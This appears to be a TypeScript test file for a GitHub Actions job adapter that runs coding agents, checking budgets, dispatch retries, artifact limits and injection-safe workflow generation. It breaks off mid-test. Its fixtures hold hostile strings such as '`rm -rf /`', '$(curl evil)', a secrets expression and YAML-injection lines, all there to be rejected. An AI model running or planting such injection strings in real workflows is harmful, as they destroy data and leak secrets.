/**
 * FREE-04: GitHub Actions as the job sandbox. Fakes only: an in-memory Actions API (dispatch, runs, artifacts,
 * secrets list, contents) and the in-memory state store. No network, no real GitHub writes, no paid calls.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { deflateRawSync } from 'node:zlib';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync as writeFile } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { CPU_MODEL, PATCH_MAX_BYTES } from '../src/cloud/actions-spec';
import { GitHubActionsAdapter, readZipEntry, runTitle } from '../src/cloud/actions-adapter';
import { chooseModelSource, engineLabel, JOB_PINS, MAX_TASK_B64, parseRunResult, rotationStatus, subscriptionChecklist, validateActionsSettings, type ActionsSettings } from '../src/cloud/actions-spec';
import { checkJobSecret, installJobWorkflow } from '../src/cloud/actions-setup';
import { ENGINE_INSTRUCTION, jobWorkflow, QWEN_SHA512_HEX } from '../src/cloud/job-workflow';
import { ProviderRouter, UnavailableProvider, DispatchFailure } from '../src/cloud/provider';
import { providersFromEnv } from '../src/cloud/cli';
import { serializeState, validateJobs, type ActionsExecution, type CloudExecution } from '../src/cloud/schema';
import { GitHubClient } from '../src/cloud/store';
import { PINNED_ACTIONS } from '../src/cloud/workflow';
import { FakeProvider, harness, intent, job, makeStore, newJob, push, uuid, EXECUTION, T0 } from './cloud-fixtures';

const json = (data: unknown, status = 200, headers: Record<string, string> = {}) =>
  new Response(data === undefined || status === 204 ? null : JSON.stringify(data), { status, headers: { 'content-type': 'application/json', ...headers } });
const HEAD = 'c'.repeat(40);
const PUSHED = 'd'.repeat(40);

const FREE: ActionsSettings = { engine: 'qwen-free', modelSource: 'cpu_small', maxTurns: 30, timeoutMinutes: 60, openPullRequest: true };
const SUB: ActionsSettings = { engine: 'claude-subscription', maxTurns: 40, timeoutMinutes: 90, openPullRequest: true };
const KEY: ActionsSettings = { engine: 'claude-api-key', maxTurns: 40, timeoutMinutes: 90, openPullRequest: false };
const exec = (actions: ActionsSettings): ActionsExecution => ({ provider: 'github-actions', repository: { owner: 'fixture', name: 'repo', baseBranch: 'main' }, actions });

/** A single-entry zip (deflated), as actions/upload-artifact produces. */
function zip(name: string, text: string): Uint8Array {
  const data = Buffer.from(text, 'utf8');
  const comp = deflateRawSync(data);
  const nameBuf = Buffer.from(name);
  const local = Buffer.alloc(30); local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(8, 8);
  local.writeUInt32LE(comp.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(nameBuf.length, 26);
  return new Uint8Array(Buffer.concat([local, nameBuf, comp]));
}

interface Run { id: number; title: string; status: string; conclusion: string | null; path: string; artifact?: Uint8Array | null; artifactSize?: number; streamBytes?: number }
class FakeActions {
  requests: { method: string; url: string; auth?: string; body?: any }[] = [];
  pulled = 0;
  blobSignal?: AbortSignal;
  runs = new Map<number, Run>();
  nextRun = 9001;
  dispatchMode: 'ok' | 'no_run_id' | 'network' | 'http500' | 'http422' | 'http404' = 'ok';
  secrets: { name: string; updated_at: string }[] = [];
  branches = new Map<string, string>();
  files = new Map<string, { sha: string; content: string }>();
  fetch = async (input: string | URL | Request, init: RequestInit = {}): Promise<Response> => {
    const url = String(input);
    const method = init.method ?? 'GET';
    const body = init.body ? JSON.parse(String(init.body)) : undefined;
    const auth = (init.headers as Record<string, string> | undefined)?.authorization;
    this.requests.push({ method, url, auth, body });
    if (url.startsWith('https://blob.example/')) {
      this.blobSignal = init.signal ?? undefined;
      if (auth) return json({ message: 'token leaked to blob storage' }, 400);
      const run = this.runs.get(Number(url.split('/').pop()));
      if (run?.streamBytes) {
        // An endless-looking body without content-length; counts how much the client actually pulls.
        const chunk = new Uint8Array(16_384).fill(0x50);
        let left = run.streamBytes;
        return new Response(new ReadableStream({ pull: c => { if (left <= 0) return c.close(); left -= chunk.length; this.pulled += chunk.length; c.enqueue(chunk); } }), { status: 200 });
      }
      return new Response(run?.artifact ? Buffer.from(run.artifact) : null, { status: 200 });
    }
    const path = url.replace('https://api.github.com', '').split('?')[0];
    let m: RegExpExecArray | null;
    if (path === '/repos/fixture/repo/commits/main') return json({ sha: HEAD });
    if (path === '/repos/fixture/repo/actions/workflows/agent-empire-job.yml/dispatches' && method === 'POST') {
      if (this.dispatchMode === 'network') throw new TypeError('fetch failed');
      if (this.dispatchMode === 'http500') return json({ message: 'boom' }, 500);
      if (this.dispatchMode === 'http422') return json({ message: 'Unexpected inputs' }, 422);
      if (this.dispatchMode === 'http404') return json({ message: 'Not Found' }, 404);
      const id = this.nextRun++;
      this.runs.set(id, { id, title: `Agent Empire job ${body.inputs.job_id} budget ${body.inputs.budget_cents}c turns ${body.inputs.max_turns}`, status: 'queued', conclusion: null, path: '.github/workflows/agent-empire-job.yml' });
      return this.dispatchMode === 'no_run_id' ? json(undefined, 204) : json({ workflow_run_id: id, run_url: `https://api.github.com/repos/fixture/repo/actions/runs/${id}`, html_url: `https://github.com/fixture/repo/actions/runs/${id}` });
    }
    if ((m = /^\/repos\/fixture\/repo\/actions\/runs\/(\d+)$/.exec(path))) {
      const run = this.runs.get(Number(m[1]));
      return run ? json({ id: run.id, display_title: run.title, status: run.status, conclusion: run.conclusion, path: run.path }) : json({ message: 'Not Found' }, 404);
    }
    if ((m = /^\/repos\/fixture\/repo\/actions\/runs\/(\d+)\/cancel$/.exec(path)) && method === 'POST') {
      const run = this.runs.get(Number(m[1]))!; run.status = 'completed'; run.conclusion = 'cancelled'; return json({}, 202);
    }
    if ((m = /^\/repos\/fixture\/repo\/actions\/runs\/(\d+)\/artifacts$/.exec(path))) {
      const run = this.runs.get(Number(m[1]))!;
      return json({ artifacts: run.artifact === null || run.artifact === undefined ? [] : [{ id: run.id, name: 'agent-empire-result', size_in_bytes: run.artifactSize ?? run.artifact.length, expired: false }] });
    }
    if ((m = /^\/repos\/fixture\/repo\/actions\/artifacts\/(\d+)\/zip$/.exec(path))) return new Response(null, { status: 302, headers: { location: `https://blob.example/${m[1]}` } });
    if ((m = /^\/repos\/fixture\/repo\/git\/ref\/heads\/(.+)$/.exec(path))) { const sha = this.branches.get(m[1]); return sha ? json({ object: { sha } }) : json({ message: 'Not Found' }, 404); }
    if (path === '/repos/fixture/repo/actions/secrets') return json({ total_count: this.secrets.length, secrets: this.secrets });
    if ((m = /^\/repos\/fixture\/repo\/contents\/(.+)$/.exec(path))) {
      const f = this.files.get(m[1]);
      if (method === 'GET') return f ? json({ sha: f.sha, content: f.content }) : json({ message: 'Not Found' }, 404);
      if (method === 'PUT') { if (f && body.sha !== f.sha) return json({ message: 'sha mismatch' }, 409); this.files.set(m[1], { sha: 'e'.repeat(40), content: body.content }); return json({ content: {} }, f ? 200 : 201); }
    }
    return json({ message: `unhandled ${method} ${path}` }, 404);
  };
  finish(id: number, result: object | null, conclusion = 'success') {
    const run = this.runs.get(id)!; run.status = 'completed'; run.conclusion = conclusion;
    run.artifact = result === null ? null : zip('result.json', JSON.stringify(result));
  }
}

function actionsHarness(settings: ActionsSettings, limits = { maxConcurrent: 2, perTaskBudgetCents: 100, dailyBudgetCents: 1000 }) {
  const gh = new FakeActions();
  const adapter = new GitHubActionsAdapter('github_pat_fixture', { fetch: gh.fetch as typeof fetch });
  const h = harness(makeStore({ execution: exec(settings), limits, mutate: s => { s.empire.setup.completed = true; s.empire.economy.startedAt = T0 - 1; } }), adapter as unknown as FakeProvider);
  return { gh, adapter, h };
}

// ---------------------------------------------------------------- money safety in the coordinator

test('free run: zero-money run-caps reservation, dispatch with inputs, cost 0, review, credits only on accept', async () => {
  const { gh, h } = actionsHarness(FREE);
  push(h.store, newJob(1, 1, { prompt: 'Fix the README typo' }));
  await h.tick();
  let state = await h.state();
  let j = job(state, 1);
  assert.equal(j.provider, 'github-actions');
  assert.equal(j.status, 'running');
  assert.deepEqual(j.reservation && { cents: j.reservation.cents, basis: j.reservation.basis }, { cents: 0, basis: 'run_caps' });
  assert.equal(j.sessionId, 'ghrun_9001');
  assert.deepEqual(j.cost && { amountCents: j.cost.amountCents, basis: j.cost.basis }, { amountCents: 0, basis: 'free_run' });
  assert.equal(state.ledger.entries.length, 0, 'a free run never enters the money ledger');
  const dispatch = gh.requests.find(r => r.url.endsWith('/dispatches'))!;
  assert.equal(dispatch.auth, 'Bearer github_pat_fixture');
  assert.equal(dispatch.body.ref, 'main');
  assert.equal(dispatch.body.return_run_details, true);
  assert.deepEqual(Object.keys(dispatch.body.inputs).sort(), ['budget_cents', 'job_id', 'max_turns', 'source_commit', 'task_b64']);
  assert.equal(dispatch.body.inputs.budget_cents, '0');
  assert.equal(Buffer.from(dispatch.body.inputs.task_b64, 'base64').toString('utf8'), 'Fix the README typo');
  assert.equal(dispatch.body.inputs.source_commit, HEAD);

  // Still running: nothing changes; then it finishes and pushed.
  await h.tick();
  gh.branches.set(`agent-empire/task-${uuid(1)}`, PUSHED);
  gh.finish(9001, { schemaVersion: 1, jobId: uuid(1), engine: 'qwen-free', status: 'changes_pushed', headSha: PUSHED, pullRequest: 7 });
  await h.tick();
  state = await h.state();
  j = job(state, 1);
  assert.equal(j.status, 'awaiting_review');
  assert.equal(j.branchHead?.sha, PUSHED);
  assert.equal(j.providerStatus, 'archived', 'the finished run record is closed so its slot is released');
  assert.equal(j.cost?.amountCents, 0);
  assert.ok(!state.empire.economy.rewardedTasks.includes(uuid(1)), 'no credits before review');
  push(h.store, intent(10, { kind: 'review', jobId: uuid(1), decision: 'accept' }));
  await h.tick();
  state = await h.state();
  assert.equal(job(state, 1).status, 'accepted');
  assert.ok(state.empire.economy.rewardedTasks.includes(uuid(1)), 'city credits move only on accept');
  assert.doesNotThrow(() => validateJobs(JSON.parse(serializeState(state)['state/jobs.json'])));
});

test('subscription run: billed to the Claude plan (0 cents, no US$), never a money reservation', async () => {
  const { gh, h } = actionsHarness(SUB);
  push(h.store, newJob(1, 1));
  await h.tick();
  gh.finish(9001, { schemaVersion: 1, jobId: uuid(1), engine: 'claude-subscription', status: 'no_changes' });
  await h.tick();
  const j = job(await h.state(), 1);
  assert.equal(j.reservation?.cents, 0, 'no money reserved');
  assert.deepEqual(j.cost && { amountCents: j.cost.amountCents, basis: j.cost.basis }, { amountCents: 0, basis: 'claude_plan' });
  assert.equal(j.status, 'awaiting_review');
  assert.match(j.message, /no commits beyond|was not found|finished/);
});

test('API-key run: money reservation as before, engine-reported estimate kept apart from observed cost', async () => {
  const { gh, h } = actionsHarness(KEY);
  push(h.store, newJob(1, 1));
  await h.tick();
  let state = await h.state();
  assert.deepEqual(job(state, 1).reservation && { cents: job(state, 1).reservation!.cents, basis: job(state, 1).reservation!.basis }, { cents: 100, basis: 'per_job_allowance_estimate' });
  assert.equal(gh.requests.find(r => r.url.endsWith('/dispatches'))!.body.inputs.budget_cents, '100');
  gh.branches.set(`agent-empire/task-${uuid(1)}`, PUSHED);
  gh.finish(9001, { schemaVersion: 1, jobId: uuid(1), engine: 'claude-api-key', status: 'changes_pushed', headSha: PUSHED, costUsdEstimate: 0.4321 });
  await h.tick();
  state = await h.state();
  const j = job(state, 1);
  assert.deepEqual(j.cost && { amountCents: j.cost.amountCents, basis: j.cost.basis }, { amountCents: 44, basis: 'engine_reported_estimate' });
  const day = Object.values(state.ledger.days)[0];
  assert.equal(day.observedCostCents, 0);
  assert.equal(day.estimatedCostCents, 44);
});

test('dispatch that may have reached GitHub becomes dispatch_uncertain and is never retried', async () => {
  for (const mode of ['network', 'http500', 'no_run_id'] as const) {
    const { gh, h } = actionsHarness(FREE);
    gh.dispatchMode = mode;
    push(h.store, newJob(1, 1));
    await h.tick();
    await h.tick();
    await h.tick();
    const j = job(await h.state(), 1);
    assert.equal(j.status, 'dispatch_uncertain', mode);
    assert.match(j.message, /Actions tab/);
    assert.equal(gh.requests.filter(r => r.url.endsWith('/dispatches')).length, 1, `${mode}: exactly one dispatch request`);
  }
});

test('a refused dispatch (4xx) proves no run started: requeued, then failed after the attempt limit', async () => {
  const { gh, h } = actionsHarness(FREE);
  gh.dispatchMode = 'http404';
  push(h.store, newJob(1, 1));
  await h.tick();
  let j = job(await h.state(), 1);
  assert.equal(j.status, 'queued');
  assert.match(j.message, /HTTP 404.*agent-empire-job\.yml/);
  await h.tick(); await h.tick();
  j = job(await h.state(), 1);
  assert.equal(j.status, 'failed');
  assert.equal(j.reservation, undefined);
});

test('run outcomes: timed out fails; cancelled cancels; a missing artifact leaves it open for review; title mismatch is unknown', async () => {
  {
    const { gh, h } = actionsHarness(FREE);
    push(h.store, newJob(1, 1)); await h.tick();
    gh.finish(9001, null, 'timed_out'); await h.tick();
    const j = job(await h.state(), 1);
    assert.equal(j.status, 'failed'); assert.match(j.message, /time cap/);
  }
  {
    const { gh, h } = actionsHarness(FREE);
    push(h.store, newJob(1, 1)); await h.tick();
    gh.finish(9001, null); await h.tick();
    const j = job(await h.state(), 1);
    assert.equal(j.status, 'idle'); assert.match(j.message, /result artifact is missing/);
  }
  {
    const { gh, h } = actionsHarness(FREE);
    push(h.store, newJob(1, 1)); await h.tick();
    gh.runs.get(9001)!.title = 'something else'; await h.tick();
    assert.equal(job(await h.state(), 1).status, 'unknown');
  }
  {
    const { gh, h } = actionsHarness(FREE);
    push(h.store, newJob(1, 1)); await h.tick();
    push(h.store, intent(5, { kind: 'cancel', jobId: uuid(1) })); await h.tick();
    assert.ok(gh.requests.some(r => r.method === 'POST' && r.url.endsWith('/actions/runs/9001/cancel')));
    await h.tick();
    assert.equal(job(await h.state(), 1).status, 'cancelled');
  }
});

test('artifact: oversized, wrong job, extra fields and model text are refused; the token never goes to blob storage', async () => {
  const { gh, h } = actionsHarness(FREE);
  push(h.store, newJob(1, 1)); await h.tick();
  gh.finish(9001, { schemaVersion: 1, jobId: uuid(2), engine: 'qwen-free', status: 'no_changes' });
  await h.tick();
  assert.match(job(await h.state(), 1).message, /different job/);
  const blob = gh.requests.filter(r => r.url.startsWith('https://blob.example/'));
  assert.ok(blob.length > 0 && blob.every(r => !r.auth));
  assert.throws(() => parseRunResult(JSON.stringify({ schemaVersion: 1, jobId: uuid(1), engine: 'qwen-free', status: 'no_changes', summary: 'model text' }), { jobId: uuid(1), engine: 'qwen-free' }), /unexpected/);
  assert.throws(() => parseRunResult(JSON.stringify({ schemaVersion: 1, jobId: uuid(1), engine: 'qwen-free', status: 'no_changes', costUsdEstimate: 1 }), { jobId: uuid(1), engine: 'qwen-free' }), /Only API-key/);
  assert.throws(() => parseRunResult('x'.repeat(5000), { jobId: uuid(1), engine: 'qwen-free' }), /too large/);
  await assert.rejects(readZipEntry(zip('result.json', 'y'.repeat(10_000)), 'result.json', 4096), /too large/);
  const big = actionsHarness(FREE);
  push(big.h.store, newJob(1, 1)); await big.h.tick();
  big.gh.finish(9001, { schemaVersion: 1, jobId: uuid(1), engine: 'qwen-free', status: 'no_changes' });
  big.gh.runs.get(9001)!.artifactSize = 50_000;
  await big.h.tick();
  assert.match(job(await big.h.state(), 1).message, /too large/);
  assert.ok(!big.gh.requests.some(r => r.url.includes('/zip')), 'an oversized artifact is never downloaded');
});

test('adapter refuses unsafe dispatches before any request: money on a free run, too-long task', async () => {
  const gh = new FakeActions();
  const adapter = new GitHubActionsAdapter('github_pat_fixture', { fetch: gh.fetch as typeof fetch });
  const base = { jobId: uuid(1), branch: `agent-empire/task-${uuid(1)}`, execution: exec(FREE) as CloudExecution };
  await assert.rejects(adapter.dispatch({ ...base, prompt: 'x', budgetCents: 100 }), (e: unknown) => e instanceof DispatchFailure && !e.sent);
  await assert.rejects(adapter.dispatch({ ...base, prompt: 'é'.repeat(MAX_TASK_B64), budgetCents: 0 }), (e: unknown) => e instanceof DispatchFailure && !e.sent && /too long/.test(e.message));
  await assert.rejects(adapter.dispatch({ ...base, execution: EXECUTION, prompt: 'x', budgetCents: 0 }), (e: unknown) => e instanceof DispatchFailure && !e.sent);
  assert.equal(gh.requests.length, 0);
  assert.equal(new GitHubActionsAdapter('').canDispatch, false);
});

test('router: picks the adapter from the execution and the session id, never from which keys exist', async () => {
  const anthropic = new FakeProvider();
  const actions = new UnavailableProvider('no project token');
  const router = new ProviderRouter({ anthropic, 'github-actions': actions });
  assert.equal(router.canDispatchFor(EXECUTION), anthropic.canDispatch);
  assert.equal(router.canDispatchFor(exec(FREE)), false);
  assert.equal(router.canDispatchFor(undefined), false);
  await assert.rejects(router.observe('ghrun_5', {}), /no project token/);
  const env = providersFromEnv({ PROJECT_GITHUB_TOKEN: 'github_pat_x' });
  assert.equal(env.canDispatchFor(exec(FREE)), true);
  assert.equal(env.canDispatchFor(EXECUTION), false, 'no Anthropic key: Anthropic jobs still wait');
  // The coordinator never reads a Claude token: providersFromEnv ignores it entirely.
  assert.equal(providersFromEnv({ CLAUDE_CODE_OAUTH_TOKEN: 'sk-ant-oat-xyz' }).canDispatchFor(exec(SUB)), false);
});

test('Anthropic Managed Agents path is unchanged: queued jobs keep provider anthropic and money reservations', async () => {
  const h = harness(makeStore());
  push(h.store, newJob(1, 1));
  await h.tick();
  const j = job(await h.state(), 1);
  assert.equal(j.provider, 'anthropic');
  assert.equal(j.reservation?.basis, 'per_job_allowance_estimate');
  assert.equal(j.reservation?.cents, 100);
  assert.equal(j.cost?.basis ?? 'provider_reported_list_cost', 'provider_reported_list_cost');
});

// ---------------------------------------------------------------- workflow generation

const NASTY = ['${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}', '`rm -rf /`', '$(curl evil)', 'line1\nline2\n  - run: echo pwned', "'; exit 0; '", '"quoted"'].join('\n');

test('job workflow: pinned SHAs, minimal permissions, workflow_dispatch only, caps, no secret exposure', () => {
  for (const settings of [FREE, SUB, KEY, { ...FREE, modelSource: 'self_hosted_ollama', runnerLabel: 'gpu-box', model: 'gpt-oss:20b' } as ActionsSettings, { ...FREE, modelSource: 'hosted_free_key', model: 'qwen/qwen3-coder:free', hostedBaseUrl: 'https://openrouter.ai/api/v1' } as ActionsSettings]) {
    const yaml = jobWorkflow({ owner: 'fixture', name: 'repo', baseBranch: 'main' }, settings);
    for (const line of yaml.split('\n').filter(l => /^\s*-? ?uses:/.test(l))) assert.match(line, /@[0-9a-f]{40} # v/, `pinned: ${line}`);
    assert.match(yaml, /^permissions: \{\}$/m);
    assert.match(yaml, /^ {6}contents: write$/m);
    assert.doesNotMatch(yaml, /pull_request_target|pull_request:|push:|schedule:|id-token|actions: write/);
    assert.match(yaml, /^on:\n {2}workflow_dispatch:/m);
    assert.match(yaml, new RegExp(`timeout-minutes: ${settings.timeoutMinutes}\\n`));
    assert.match(yaml, /concurrency:\n {2}group: agent-empire-job-\$\{\{ inputs\.job_id \}\}/);
    assert.match(yaml, /if: github\.repository == 'fixture\/repo'/);
    assert.match(yaml, /persist-credentials: false/);
    // Inputs reach shell only through env, never interpolated into a run: line.
    for (const line of yaml.split('\n').filter(l => /\$\{\{/.test(l))) {
      assert.ok(!/^\s*(run:|.*\$\(|echo .*\$\{\{)/.test(line) || /run-name/.test(line), `expression outside env/with: ${line}`);
    }
    assert.doesNotMatch(yaml, /run: [^\n]*\$\{\{/, 'no expression on a single-line run');
    const secrets = [...yaml.matchAll(/secrets\.([A-Z_]+)/g)].map(m => m[1]);
    assert.ok(secrets.every(s => ['CLAUDE_CODE_OAUTH_TOKEN', 'ANTHROPIC_API_KEY', 'FREE_LLM_API_KEY'].includes(s)));
    assert.ok(secrets.length <= 1, 'at most one engine secret per workflow');
  }
  const free = jobWorkflow({ owner: 'fixture', name: 'repo', baseBranch: 'main' }, FREE);
  assert.ok(free.includes(`npm pack @qwen-code/qwen-code@${JOB_PINS.qwen.version}`));
  assert.ok(free.includes(`${QWEN_SHA512_HEX}  qwen-code-qwen-code-${JOB_PINS.qwen.version}.tgz" | sha512sum -c -`));
  assert.ok(free.includes(`${JOB_PINS.ollama.sha256}  ollama.tar.zst" | sha256sum -c -`));
  assert.doesNotMatch(free, /GH_TOKEN[^\n]*\n[^\n]*qwen --prompt/, 'Qwen runs without a GitHub token');
  assert.match(free, /pull-requests: write/);
  const sub = jobWorkflow({ owner: 'fixture', name: 'repo', baseBranch: 'main' }, SUB);
  assert.ok(sub.includes(`anthropics/claude-code-action@${JOB_PINS.claudeCodeAction.sha} # ${JOB_PINS.claudeCodeAction.version}`));
  assert.ok(sub.includes('claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}'));
  assert.doesNotMatch(sub, /anthropic_api_key/);
  const key = jobWorkflow({ owner: 'fixture', name: 'repo', baseBranch: 'main' }, KEY);
  assert.ok(key.includes('anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}'));
  assert.doesNotMatch(key, /pull-requests: write/);
  assert.ok(free.includes(PINNED_ACTIONS.checkout.sha));
});

test('job workflow: the task never enters the YAML, whatever it contains; dispatch carries it base64 only', async () => {
  const yaml = jobWorkflow({ owner: 'fixture', name: 'repo', baseBranch: 'main' }, FREE);
  assert.ok(!yaml.includes('rm -rf') && !yaml.includes('pwned'));
  assert.match(yaml, /TASK_B64: \$\{\{ inputs\.task_b64 \}\}\n {8}run: \|\n {10}set -euo pipefail\n {10}\[\[ "\$TASK_B64" =~ \^\[A-Za-z0-9\+\/\]\+=\{0,2\}\$ \]\]/);
  assert.ok(yaml.includes(JSON.stringify(ENGINE_INSTRUCTION)));
  const gh = new FakeActions();
  const adapter = new GitHubActionsAdapter('github_pat_fixture', { fetch: gh.fetch as typeof fetch });
  await adapter.dispatch({ jobId: uuid(1), branch: `agent-empire/task-${uuid(1)}`, execution: exec(FREE), prompt: NASTY, budgetCents: 0 });
  const inputs = gh.requests.find(r => r.url.endsWith('/dispatches'))!.body.inputs;
  assert.match(inputs.task_b64, /^[A-Za-z0-9+/]+={0,2}$/);
  assert.equal(Buffer.from(inputs.task_b64, 'base64').toString('utf8'), NASTY);
  for (const [k, v] of Object.entries(inputs)) if (k !== 'task_b64') assert.match(String(v), /^[0-9a-f-]+$/, k);
  assert.equal(gh.runs.get(9001)!.title, runTitle(uuid(1), 0, 30));
});

test('settings validation refuses anything that could inject into YAML', () => {
  const bad: unknown[] = [
    { ...FREE, modelSource: 'self_hosted_ollama', runnerLabel: 'x]\n  evil: 1', model: 'm' },
    { ...FREE, modelSource: 'self_hosted_ollama', runnerLabel: 'ok', model: "m' ; curl x" },
    { ...FREE, modelSource: 'hosted_free_key', model: 'm', hostedBaseUrl: 'http://insecure.example/v1' },
    { ...FREE, modelSource: 'hosted_free_key', model: 'm', hostedBaseUrl: 'https://user:pw@x.example/v1' },
    { ...FREE, modelSource: 'hosted_free_key', model: 'm', hostedBaseUrl: 'https://x.example/v1?key=${{ secrets.X }}' },
    { ...FREE, maxTurns: 0 }, { ...FREE, timeoutMinutes: 361 }, { ...SUB, model: 'x' }, { ...FREE, extra: 1 },
  ];
  for (const b of bad) assert.throws(() => validateActionsSettings(b), undefined, JSON.stringify(b));
  assert.throws(() => jobWorkflow({ owner: 'a b', name: 'r', baseBranch: 'main' }, FREE));
  assert.throws(() => jobWorkflow({ owner: 'a', name: 'r', baseBranch: 'main\nx' }, FREE));
});

test('model source order: self-hosted runner, then free hosted key, then CPU; honest labels', () => {
  assert.equal(chooseModelSource({ selfHostedLabel: 'box', hostedKeyOptIn: true, cpuOptIn: true }), 'self_hosted_ollama');
  assert.equal(chooseModelSource({ hostedKeyOptIn: true, cpuOptIn: true }), 'hosted_free_key');
  assert.equal(chooseModelSource({ cpuOptIn: true }), 'cpu_small');
  assert.equal(chooseModelSource({}), null);
  assert.equal(engineLabel(validateActionsSettings(FREE)), 'Qwen Code · qwen2.5-coder:1.5b (CPU, slow)');
  assert.equal(engineLabel(SUB), 'Claude Code · your Claude account');
});

// ---------------------------------------------------------------- setup: secret names only, workflow install

test('secret check reads names only, reminds to rotate at 11 months, and has no way to accept a token', async () => {
  const gh = new FakeActions();
  const client = new GitHubClient('gho_user', { fetch: gh.fetch as typeof fetch });
  const now = Date.parse('2026-10-24T00:00:00Z');
  assert.deepEqual(await checkJobSecret(client, { owner: 'fixture', name: 'repo' }, SUB, now), { name: 'CLAUDE_CODE_OAUTH_TOKEN', present: false });
  gh.secrets = [{ name: 'CLAUDE_CODE_OAUTH_TOKEN', updated_at: '2025-11-01T00:00:00Z' }];
  const due = await checkJobSecret(client, { owner: 'fixture', name: 'repo' }, SUB, now);
  assert.equal(due.present, true); assert.equal(due.rotationDue, true);
  gh.secrets = [{ name: 'CLAUDE_CODE_OAUTH_TOKEN', updated_at: '2026-10-01T00:00:00Z' }];
  assert.equal((await checkJobSecret(client, { owner: 'fixture', name: 'repo' }, SUB, now)).rotationDue, false);
  assert.deepEqual(await checkJobSecret(client, { owner: 'fixture', name: 'repo' }, FREE, now), { name: null, present: true });
  const reqs = gh.requests;
  assert.ok(reqs.every(r => r.method === 'GET' && r.body === undefined), 'only GETs, never a secret write');
  assert.equal(checkJobSecret.length, 4, 'no token parameter');
  assert.equal(rotationStatus(undefined, now).due, false);
  assert.deepEqual(subscriptionChecklist({ owner: 'fixture', name: 'repo' }), ['claude setup-token', 'gh secret set CLAUDE_CODE_OAUTH_TOKEN --repo fixture/repo']);
});

test('job workflow install commits once and skips when unchanged', async () => {
  const gh = new FakeActions();
  const client = new GitHubClient('gho_user', { fetch: gh.fetch as typeof fetch });
  const target = { owner: 'fixture', name: 'repo', baseBranch: 'main' };
  assert.equal(await installJobWorkflow(client, target, FREE), 'installed');
  assert.equal(await installJobWorkflow(client, target, FREE), 'unchanged');
  assert.equal(await installJobWorkflow(client, target, SUB), 'installed');
  assert.equal(gh.requests.filter(r => r.method === 'PUT').length, 2);
});

// ---------------------------------------------------------------- security review fixes (H1, M1, M2, L1-L4)

const TARGET = { owner: 'fixture', name: 'repo', baseBranch: 'main' };
/** The two jobs of the generated workflow, split by their keys under `jobs:`. */
function jobsOf(yaml: string) {
  const work = yaml.indexOf('\n  work:\n'); const publish = yaml.indexOf('\n  publish:\n');
  assert.ok(work > 0 && publish > work, 'two jobs: work, then publish');
  return { agent: yaml.slice(work, publish), publish: yaml.slice(publish) };
}
/** The `run: |` block of the named step, de-indented. */
function stepScript(section: string, name: string): string {
  const lines = section.split('\n');
  const at = lines.findIndex(l => l.trim() === `- name: ${name}`);
  assert.ok(at >= 0, `step ${name}`);
  const run = lines.findIndex((l, i) => i > at && l.trim() === 'run: |');
  const indent = lines[run + 1].search(/\S/);
  const body: string[] = [];
  for (let i = run + 1; i < lines.length && (lines[i].trim() === '' || lines[i].search(/\S/) >= indent); i++) body.push(lines[i].slice(indent));
  return body.join('\n');
}

test('H1/M2: the agent job has read-only contents and no write token; Qwen never sees github.token', () => {
  for (const settings of [FREE, SUB, KEY]) {
    const { agent } = jobsOf(jobWorkflow(TARGET, settings));
    assert.match(agent, /\n {4}permissions:\n {6}contents: read\n {4}[a-z]/, 'contents: read only');
    assert.doesNotMatch(agent, /contents: write|pull-requests: write|id-token|GH_TOKEN|gh auth|git push|gh pr/);
    const tokenLines = agent.split('\n').filter(l => l.includes('github.token'));
    if (settings.engine === 'qwen-free') assert.equal(tokenLines.length, 0);
    // claude-code-action will not start without a token (it would otherwise request an OIDC app token); it gets the
    // job's own token, which this job's permissions make read-only.
    else assert.deepEqual(tokenLines.map(l => l.trim()), ['github_token: ${{ github.token }}']);
    assert.match(agent, /git -c core\.hooksPath=\/dev\/null[^\n]*diff --cached --binary/);
    assert.match(agent, /name: agent-empire-change/);
  }
});

test('H1: the publish job runs no agent code, needs the agent job, and enforces the patch cap and task-branch-only push', () => {
  for (const settings of [FREE, SUB, KEY, { ...FREE, modelSource: 'self_hosted_ollama', runnerLabel: 'box', model: 'm' } as ActionsSettings]) {
    const { publish } = jobsOf(jobWorkflow(TARGET, settings));
    assert.match(publish, /\n {4}needs: work\n/);
    assert.match(publish, /\n {4}runs-on: ubuntu-latest\n/, 'always a fresh GitHub-hosted runner');
    assert.doesNotMatch(publish, /qwen|claude-code-action|ollama|npm |setup-node|AGENT_EMPIRE_INSTRUCTION|secrets\./i);
    assert.match(publish, /download-artifact@[0-9a-f]{40}/);
    assert.ok(publish.includes(`-gt ${PATCH_MAX_BYTES} `));
    assert.match(publish, /git -c core\.hooksPath=\/dev\/null apply --index/);
    assert.match(publish, /push origin "HEAD:refs\/heads\/agent-empire\/task-\$JOB_ID"/);
    assert.equal((publish.match(/ push /g) ?? []).length, 1, 'exactly one push, to the task branch');
  }
});

test('H1/N2: the publish job refuses hostile patches: pre-filter, then the staged result (real scripts, fresh repos)', () => {
  const publish = jobsOf(jobWorkflow(TARGET, FREE)).publish;
  const checkScript = stepScript(publish, 'Check the change');
  const applyScript = stepScript(publish, 'Apply and verify the staged change');
  const base = mkdtempSync(join(tmpdir(), 'free04-'));
  let n = 0;
  /** Runs both publish steps against a fresh repository; true only when the change would be published. */
  const publishes = (patch: string) => {
    const dir = join(base, `r${n++}`);
    const git = (...args: string[]) => execFileSync('git', ['-C', dir, ...args], { stdio: 'pipe', timeout: 10_000 }).toString();
    execFileSync('git', ['init', '-q', dir], { timeout: 10_000 });
    git('config', 'user.email', 't@t'); git('config', 'user.name', 't');
    writeFile(join(dir, 'README.md'), 'hello\n'); git('add', '.'); git('commit', '-qm', 'init');
    const file = join(base, `p${n}.patch`);
    writeFile(file, patch);
    const env = { ...process.env, PATCH: file, SOURCE_COMMIT: git('rev-parse', 'HEAD').trim(), JOB_ID: uuid(1), GITHUB_OUTPUT: join(base, `out${n}`) };
    for (const script of [checkScript, applyScript]) {
      try { execFileSync('bash', ['-c', script], { cwd: dir, env, stdio: 'pipe', timeout: 10_000 }); } catch { return false; }
    }
    return true;
  };
  const np = (path: string, content: string, modeLine: string) => [
